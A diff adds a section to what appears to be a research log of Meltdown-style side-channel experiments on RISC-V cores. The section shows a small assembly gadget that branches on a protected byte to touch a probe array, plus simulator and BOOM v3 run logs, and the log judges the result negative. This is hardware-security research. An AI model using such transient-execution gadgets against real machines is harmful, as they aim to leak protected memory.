@@ -1649,3 +1649,68 @@ So PMP/M-mode-skip is the most promising fault source so far, but only for
 fixed younger-load diagnostics. It still has not propagated the faulting secret
 byte through the tested dependent address chains strongly enough to recover
 `0x53`.
+
+## Candidate-Compare Variant 6
+
+`MELTDOWN_US_GADGET_VARIANT=6` changes the secret-dependent gadget from
+address selection to a candidate-confirmation branch:
+
+```asm
+lbu  t0, 0(secret_va)
+li   t2, 0x53
+bne  t0, t2, 1f
+slli t2, t2, PROBE_SHIFT
+add  t2, t2, probe
+lb   t1, 0(t2)
+1:
+```
+
+This is not a full 256-byte recovery gadget. It asks a narrower question: can
+the transient value loaded from the protected byte control a branch strongly
+enough to touch fixed `probe[0x53]`? If positive, the next step would be a
+candidate sweep over byte values.
+
+Spike smoke passed:
+
+```text
+MELTDOWN_US_PMP_FAULT=1
+MELTDOWN_US_MMODE_FAULT_SKIP=1
+MELTDOWN_US_GADGET_VARIANT=6
+MELTDOWN_US_DEBUG_ONLY=1
+MELTDOWN_US_TIME_REPS=8
+MELTDOWN_US_CAL_REPS=5
+MELTDOWN_US_ATTEMPTS=1
+meltdown-us: fault_mode=pmp-access
+meltdown-us: timing hit=68 miss=68 threshold=68
+meltdown-us: pmp training value=0x53
+meltdown-us: pmp deny armed
+meltdown-us: raw attempt=0 i53=68 ...
+meltdown-us: done
+SPIKE: PASS
+```
+
+BOOM v3 result:
+
+```text
+log: targets/boom/logs/MediumBoomV3Config-minios-meltdown-us-pmp-mskip-c1-var6-debugonly-r8-a1.log
+CPUS=1
+MELTDOWN_US_NPROC=4
+MELTDOWN_US_PMP_FAULT=1
+MELTDOWN_US_MMODE_FAULT_SKIP=1
+MELTDOWN_US_GADGET_VARIANT=6
+MELTDOWN_US_TIME_REPS=8
+MELTDOWN_US_CAL_REPS=5
+MELTDOWN_US_ATTEMPTS=1
+meltdown-us: timing hit=210 miss=305 threshold=257
+meltdown-us: pmp training value=0x53
+meltdown-us: pmp deny armed
+meltdown-us: raw attempt=0 i53=260 i0=287 i80=294 i1=257 i55=316 i51=251 i56=250 i50=250 i54=250 i52=250
+meltdown-us: fault recovery ok
+meltdown-us: done
+real 360.87
+```
+
+This is negative. The target bucket is above threshold (`i53=260 > 257`), while
+several neighboring/control buckets are lower (`i51=251`, `i56/i50/i54=250`).
+Variant 6 therefore does not prove that the protected byte controls transient
+branch direction on BOOM v3.
